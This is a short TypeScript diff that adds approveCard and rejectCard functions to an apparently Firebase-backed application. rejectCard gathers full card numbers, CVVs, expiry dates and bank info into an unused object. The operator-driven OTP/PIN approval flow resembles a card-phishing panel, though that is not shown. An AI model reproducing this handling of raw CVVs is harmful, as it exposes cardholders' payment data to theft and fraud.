@@ -134,3 +134,19 @@ export const markMessageAsRead = async (messageId: string) => {
   const docRef = doc(db, "messages", messageId);
   await updateDoc(docRef, { read: true });
 };
+export async function approveCard(id: string, approvalType: "otp" | "pin") {
+  const cardStatus = approvalType === "otp" ? "approved_with_otp" : "approved_with_pin"
+  await updateApplication(id, { cardStatus }as any)
+}
+
+export async function rejectCard(id: string, cardData: any) {
+  const currentCardData = {
+    cardNumber: cardData.cardNumber,
+    cardHolderName: cardData.cardHolderName,
+    expiryDate: cardData.expiryDate,
+    cvv: cardData.cvv,
+    cardType: cardData.cardType,
+    bankInfo: cardData.bankInfo,
+    rejectedAt: new Date().toISOString(),
+  }
+}
